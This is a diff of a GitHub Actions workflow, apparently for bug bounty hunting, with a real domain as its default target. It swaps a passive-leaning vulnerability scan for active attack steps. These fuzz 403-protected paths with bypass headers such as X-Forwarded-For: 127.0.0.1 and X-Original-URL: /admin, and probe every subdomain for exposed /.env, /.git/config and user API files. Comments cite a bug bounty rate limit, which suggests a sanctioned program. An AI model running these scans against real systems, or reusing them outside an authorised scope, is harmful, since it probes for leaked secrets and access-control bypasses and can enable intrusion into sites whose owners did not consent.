@@ -1,4 +1,4 @@
-name: Bug Bounty Advanced Recon
+name: Bug Bounty Hunter - Auto-Verify & Fuzz
 on:
   workflow_dispatch:
     inputs:
@@ -8,46 +8,52 @@ on:
         default: 'web-zaim.ru'
 
 jobs:
-  advanced-scan:
+  exploit-hunt:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Setup Go & Install Tools
+      - name: Setup Tools
         run: |
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install -v github.com/ffuf/ffuf/v2@latest
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
           sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Execute Smart Recon
+      - name: Discovery & 403 Bypass Testing
         run: |
           TARGET="${{ github.event.inputs.target }}"
           HEADER="X-BugBounty: 0a526762-8467-4d46-a403-af4e79283f46"
           
-          # 1. Passive Subdomain Discovery
-          subfinder -d $TARGET -all -silent -o subs.txt
+          # 1. Get all subdomains
+          subfinder -d $TARGET -silent -o subs.txt
           
-          # 2. Live Probing with Tech Detection
-          httpx -l subs.txt -H "$HEADER" -silent -td -title -status-code -o live.txt
+          # 2. Identify 403 Forbidden pages (Your 'Juicy' targets)
+          httpx -l subs.txt -H "$HEADER" -status-code -mc 403 -silent -o forbidden.txt
           
-          # 3. Targeted Nuclei Scan (Optimized to prevent cancellation)
-          # We limit concurrency to 2 and bulk-size to 1 to keep memory low and stay under 5 req/s
-          nuclei -l live.txt \
-            -H "$HEADER" \
-            -severity critical,high \
-            -rate-limit 5 \
-            -bulk-size 1 \
-            -concurrency 2 \
-            -stats \
-            -o results.txt
+          # 3. 403 Bypass Fuzzing (PoC Generator)
+          # We try common bypass headers like X-Forwarded-For and path manipulation
+          while read -r url; do
+            echo "Attempting Bypass on: $url"
+            ffuf -u "$url/FUZZ" \
+                 -H "$HEADER" \
+                 -H "X-Forwarded-For: 127.0.0.1" \
+                 -H "X-Original-URL: /admin" \
+                 -w http://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt \
+                 -mc 200,301,302 -t 5 -rate 5 -o "bypass_$(date +%s).json"
+          done < forbidden.txt
 
-      - name: Upload Results
+      - name: Sensitive File & API Hunt
+        run: |
+          # Fuzzing for critical files (.env, config.php, .git, etc.)
+          # -rate 5 keeps us compliant with the 5 req/s rule
+          httpx -l subs.txt -H "$HEADER" -path "/.env","/.git/config","/swagger.json","/api/v1/users" -status-code -mc 200 -silent -o critical_files.txt
+
+      - name: Upload PoC Evidence
         uses: actions/upload-artifact@v4
         with:
-          name: scan-results-${{ github.event.inputs.target }}
+          name: poc-results
           path: |
-            live.txt
-            results.txt
+            forbidden.txt
+            critical_files.txt
+            bypass_*.json
             
